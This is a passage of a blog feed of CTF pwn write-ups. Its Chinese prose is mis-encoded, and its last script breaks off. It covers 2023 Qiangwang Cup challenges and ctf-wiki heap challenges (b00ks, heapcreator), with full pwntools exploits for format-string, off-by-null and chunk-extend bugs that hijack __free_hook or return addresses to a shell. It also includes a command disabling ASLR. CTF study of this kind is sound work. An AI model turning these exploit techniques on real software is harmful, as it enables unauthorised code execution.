      
      
    </entry>
    
    
    
    <entry>
      <title>2023 å¼ºç½‘æ¯å°è®°</title>
      <link href="/posts/11686/"/>
      <url>/posts/11686/</url>
      
        <content type="html"><![CDATA[<p>æ˜¨å¤©5ç‚¹å¼ºç½‘æ¯ç»“æŸï¼Œåç‰¢ä¸¤å¤©ï¼ŒæŠ˜ç£¨çš„ä¸€æ‰¹</p><h1 id="å¼ºç½‘å…ˆé”‹"><a href="#å¼ºç½‘å…ˆé”‹" class="headerlink" title="å¼ºç½‘å…ˆé”‹"></a>å¼ºç½‘å…ˆé”‹</h1><h2 id="ez-fmt"><a href="#ez-fmt" class="headerlink" title="ez_fmt"></a>ez_fmt</h2><p>æ³„éœ²libcåŸºå€ï¼Œä¿®æ”¹printfå‡½æ•°è¿”å›åœ°å€ä¸ºstarté‡æ–°æ‰§è¡Œï¼Œä¿®æ”¹mainè¿”å›åœ°å€ä¸ºone_gadget</p><p><code>ps:printfå‡½æ•°å†…éƒ¨æ‰§è¡ŒretæŒ‡ä»¤å‰ï¼Œæ•°æ®å·²ç»ä¿®æ”¹å®Œæˆï¼Œæ‰€ä»¥ä¿®æ”¹printfå‡½æ•°è¿”å›åœ°å€ä¹Ÿæ˜¯okçš„</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./ez_fmt&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;47.104.24.40&#x27;,1337)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;There is a gift for you &#x27;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)+<span class="number">0x68</span></span><br><span class="line">stack1=stack-<span class="number">0x70</span></span><br><span class="line">log.success(<span class="string">&#x27;stack =&gt; &#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">read=<span class="number">0x40121B</span></span><br><span class="line">printf=<span class="number">0x4011ED</span></span><br><span class="line">start=<span class="number">0x4010B0</span></span><br><span class="line">exe=<span class="number">0xe3afe</span></span><br><span class="line">fake=exe+<span class="number">0x7fa8eb328000</span></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x401239&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%19$p&#x27;</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((start&amp;<span class="number">0xffff</span>)-<span class="number">0xe</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%9$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">24</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(stack1)</span><br><span class="line">p.send(payload)</span><br><span class="line">libcbase=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x24083</span></span><br><span class="line">log.success(<span class="string">&#x27;libcbase =&gt; &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">exe=<span class="number">0xe3b01</span>+libcbase</span><br><span class="line">log.success(<span class="string">&#x27;exe =&gt;&#x27;</span>+<span class="built_in">hex</span>(exe))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;There is a gift for you &#x27;</span>)</span><br><span class="line">stack2=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)+<span class="number">0x68</span></span><br><span class="line">log.success(<span class="string">&#x27;stack2 =&gt;&#x27;</span>+<span class="built_in">hex</span>(stack2))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(((exe&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%10$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((exe&amp;<span class="number">0xffff</span>)-((exe&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%11$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">32</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(stack2+<span class="number">2</span>)+p64(stack2)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="trie"><a href="#trie" class="headerlink" title="trie"></a>trie</h2><p>é€»è¾‘æ¼æ´ï¼Œæ€è·¯æ˜¯é€šè¿‡<code>add</code>æ·»åŠ destination IPä½¿next hopå†™åˆ°secretä¸Šï¼Œè°ƒç”¨<code>get_flag</code>æŠŠflagè¦†ç›–åˆ°secretï¼Œ<code>view</code>æŠŠflagæ‰“å‡ºæ¥</p><p>éš¾ç‚¹åœ¨äºç¡®å®šdestination IPçš„å€¼</p><p>è´´ä¸ªåŠæˆå“wp(æœªå®Œå¾…ç»­â€¦)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(b&#x27;47.104.150.173&#x27;,1337)</span></span><br><span class="line">p=process(<span class="string">&#x27;./trie&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *$rebase(0x157E)&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">ip,hop</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;4. Quit.\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input destination IP:\n&#x27;</span>,ip)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the next hop:&#x27;</span>,hop)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">ip</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;4. Quit.\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input destination IP:\n&#x27;</span>,ip)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;4. Quit.\n&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;1.1.1.1&#x27;</span>,<span class="string">b&#x27;2.2.2.2&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;0.0.0.0&#x27;</span>,<span class="string">b&#x27;255.255.255.255&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="string">b&#x27;128.0.0.0&#x27;</span>,<span class="string">b&#x27;255.255.255.255&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="string">b&#x27;192.0.0.0&#x27;</span>,<span class="string">b&#x27;255.255.255.255&#x27;</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">flag()</span><br><span class="line">view(<span class="string">b&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line">view(<span class="string">b&#x27;128.0.0.0&#x27;</span>)</span><br><span class="line">view(<span class="string">b&#x27;192.0.0.0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>off-by-one</title>
      <link href="/posts/40587/"/>
      <url>/posts/40587/</url>
      
        <content type="html"><![CDATA[<h1 id="b00ks"><a href="#b00ks" class="headerlink" title="b00ks"></a>b00ks</h1><p>é¢˜ç›®åœ°å€:<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks">b00ks</a></p><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><p>å…³é—­ASLRä¿æŠ¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><h3 id="brkä¸mmap"><a href="#brkä¸mmap" class="headerlink" title="brkä¸mmap"></a>brkä¸mmap</h3><p>å †æœ‰ä¸¤ç§æ‹“å±•æ–¹å¼ä¸€ç§æ˜¯ brk ä¼šç›´æ¥æ‹“å±•åŸæ¥çš„å †ï¼Œå¦ä¸€ç§æ˜¯ mmap ä¼šå•ç‹¬æ˜ å°„ä¸€å—å†…å­˜ã€‚<br>æˆ‘ä»¬ç”³è¯·ä¸€ä¸ªè¶…å¤§çš„å—ï¼Œæ¥ä½¿ç”¨ mmap æ‰©å±•å†…å­˜ã€‚å› ä¸º mmap åˆ†é…çš„å†…å­˜ä¸ libc ä¹‹å‰å­˜åœ¨å›ºå®šçš„åç§»å› æ­¤å¯ä»¥æ¨ç®—å‡º libc çš„åŸºåœ°å€ã€‚</p><h3 id="hookå‡½æ•°"><a href="#hookå‡½æ•°" class="headerlink" title="hookå‡½æ•°"></a>hookå‡½æ•°</h3><p>åœ¨2.34åŠä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­åˆ é™¤äº†malloc_hookã€freehookç­‰é’©å­å‡½æ•°ï¼Œè™½ç„¶åœ¨libcä¸­æˆ‘ä»¬ä»ç„¶èƒ½å¤ŸæŸ¥è¯¢åˆ°æ ‡ç­¾ï¼Œä½†æ˜¯å®é™…ä¸Šå·²ç»ä¸å‚ä¸è°ƒç”¨äº†ï¼Œè¿™å°±å¯¼è‡´ä¹‹å‰çš„å¯¹äºå †çš„è®¸å¤šæ”»å‡»æ‰‹æ³•éƒ½åŸºæœ¬å¤±æ•ˆäº†ã€‚</p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><h3 id="é€†å‘"><a href="#é€†å‘" class="headerlink" title="é€†å‘"></a>é€†å‘</h3><p>é€†å‘å‡ºå…³é”®ç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v2[<span class="number">6</span>] = <span class="number">0</span>;                        <span class="comment">// size</span></span><br><span class="line">*(description + v1) = v2;         <span class="comment">// struct pointer</span></span><br><span class="line">*(v2 + <span class="number">2</span>) = v4;                   <span class="comment">// description pointer</span></span><br><span class="line">*(v2 + <span class="number">1</span>) = ptr;                  <span class="comment">// name pointer</span></span><br><span class="line">*v2 = ++id;                       <span class="comment">// id</span></span><br></pre></td></tr></table></figure><h2 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h2><p>å¾ªç¯è®¾ç½®é”™è¯¯,æœ€åå¤šè¾“å…¥ä¸€ä¸ªå­—èŠ‚,å­˜åœ¨off-by-null</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, name, <span class="number">1uLL</span>) != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *name == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  ++name;</span><br><span class="line">  <span class="keyword">if</span> ( i == size )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">*name = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><p>off-by-nullè¦†ç›–<code>struct1</code>çš„æŒ‡é’ˆæœ€åä¸€å­—èŠ‚ä¸º<code>\x00</code>,æå‰åœ¨è¯¥åœ°å€å¸ƒç½®<code>fake_struct</code>,å¹¶ä¼ªé€ <code>fake_struct</code>çš„<code>name pointer</code>å’Œ<code>description pointer</code>ä¸º<code>struct2</code>ä¸­<code>name pointer</code>å’Œ<code>description pointer</code>çš„åœ°å€,è®¡ç®—libcbaseåç§»,åŠ«æŒ<code>struct2</code>ä¸­<code>description pointer</code>ä¸º<code>free_hook</code>,one_gadgetæ‹¿shell</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./b00ks&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/tr0upe/tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#cmd=&#x27;b *$rebase(0x1188)\n&#x27;</span></span><br><span class="line"><span class="comment">#cmd=&#x27;b *$rebase(0xCA6)\n&#x27;</span></span><br><span class="line"><span class="comment">#cmd+=&#x27;b *$rebase(0xCA3)&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(p,cmd)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">creat</span>(<span class="params">size,name,size1,description</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Enter book name size:&#x27;</span>,size)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Enter book name (Max 32 chars):&#x27;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Enter book description size:&#x27;</span>,size1)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Enter book description:&#x27;</span>,description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Enter the book id you want to delete:&#x27;</span>,index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Enter the book id you want to edit: &#x27;</span>,index)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Enter new book description: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printf</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">author</span>(<span class="params">author_name</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Enter author name: &#x27;</span>,author_name)</span><br><span class="line"></span><br><span class="line">author1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Enter author name:&#x27;</span>,author1)</span><br><span class="line"></span><br><span class="line">creat(<span class="string">b&#x27;32&#x27;</span>,<span class="string">&#x27;bbbbb&#x27;</span>,<span class="string">b&#x27;256&#x27;</span>,<span class="string">&#x27;ccccc&#x27;</span>)</span><br><span class="line">creat(<span class="string">b&#x27;135168&#x27;</span>,<span class="string">&#x27;ddddd&#x27;</span>,<span class="string">b&#x27;135168&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">struct1=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;struct1 =&gt; &#x27;</span>+<span class="built_in">hex</span>(struct1))</span><br><span class="line">struct2=struct1+<span class="number">0x30</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;struct2 =&gt; &#x27;</span>+<span class="built_in">hex</span>(struct2))</span><br><span class="line">name2_addr=struct2+<span class="number">0x8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;name2_addr =&gt; &#x27;</span>+<span class="built_in">hex</span>(name2_addr))</span><br><span class="line">des2_addr=struct2+<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;des2_addr =&gt; &#x27;</span>+<span class="built_in">hex</span>(des2_addr))</span><br><span class="line"></span><br><span class="line">fake_struct=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0xb0</span>+p64(<span class="number">1</span>)+p64(name2_addr)+p64(des2_addr)+p64(<span class="number">0xffff</span>)</span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>,fake_struct)</span><br><span class="line">author(<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">printf()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Name: &#x27;</span>)</span><br><span class="line">name2_ptr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;name2_ptr =&gt; &#x27;</span>+<span class="built_in">hex</span>(name2_ptr))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Description: &#x27;</span>)</span><br><span class="line">des2_ptr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;des2_ptr =&gt; &#x27;</span>+<span class="built_in">hex</span>(des2_ptr))</span><br><span class="line"></span><br><span class="line">libcbase=name2_ptr-<span class="number">0x5c7010</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">free_hook=libcbase+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">exe=libcbase+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">one_gadget=<span class="number">0x4525a</span>+libcbase</span><br><span class="line"></span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>,p64(free_hook))</span><br><span class="line">edit(<span class="string">b&#x27;2&#x27;</span>,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">delete(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="chunk-extend"><a href="#chunk-extend" class="headerlink" title="chunk_extend"></a>chunk_extend</h1><h2 id="åŸºæœ¬ç¤ºä¾‹-1ï¼šå¯¹-inuse-çš„-fastbin-è¿›è¡Œ-extend"><a href="#åŸºæœ¬ç¤ºä¾‹-1ï¼šå¯¹-inuse-çš„-fastbin-è¿›è¡Œ-extend" class="headerlink" title="åŸºæœ¬ç¤ºä¾‹ 1ï¼šå¯¹ inuse çš„ fastbin è¿›è¡Œ extend"></a>åŸºæœ¬ç¤ºä¾‹ 1ï¼šå¯¹ inuse çš„ fastbin è¿›è¡Œ extend</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//åˆ†é…ç¬¬ä¸€ä¸ª0x10çš„chunk</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//åˆ†é…ç¬¬äºŒä¸ª0x10çš„chunk</span></span><br><span class="line"></span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> *)((<span class="type">long</span> <span class="type">long</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x41</span>;<span class="comment">// ä¿®æ”¹ç¬¬ä¸€ä¸ªå—çš„sizeåŸŸ</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x30</span>);<span class="comment">// å®ç° extendï¼Œæ§åˆ¶äº†ç¬¬äºŒä¸ªå—çš„å†…å®¹</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="heapcreator"><a href="#heapcreator" class="headerlink" title="heapcreator"></a>heapcreator</h3><p>é¢˜ç›®åœ°å€:<a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13/heapcreator">heapcreator</a></p><h4 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h4><p><code>prev_size</code>:å¦‚æœå‰ä¸€ä¸ªåŒºå—æ˜¯ç©ºé—²çš„ï¼Œåˆ™æ­¤å­—æ®µåŒ…å«å‰ä¸€ä¸ªå—çš„å¤§å°ã€‚å¦åˆ™ï¼Œå¦‚æœåˆ†é…äº†å‰ä¸€ä¸ªåŒºå—ï¼Œåˆ™æ­¤å­—æ®µåŒ…å«å‰ä¸€ä¸ªå—çš„ç”¨æˆ·æ•°æ®ã€‚</p><h4 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> *(v0 + <span class="number">8</span>) = <span class="built_in">malloc</span>(size);                 <span class="comment">// struct content</span></span><br><span class="line">**(&amp;heaparray + i) = size;                <span class="comment">// struct size</span></span><br></pre></td></tr></table></figure><h4 id="æ¼æ´-1"><a href="#æ¼æ´-1" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h4><p>editå‡½æ•°å¯ä»¥è¾“å…¥çš„sizeå¤§1,å­˜åœ¨off_by_one</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read_input(*(*(&amp;heaparray + v1) + <span class="number">1</span>), **(&amp;heaparray + v1) + <span class="number">1LL</span>);</span><br></pre></td></tr></table></figure><h4 id="åˆ©ç”¨-1"><a href="#åˆ©ç”¨-1" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><p>ä¿®æ”¹sizeåŸŸï¼Œè¿›è¡Œextendï¼Œå°±å¯ä»¥è¿›è¡Œä»»æ„åœ°å€å†™</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span 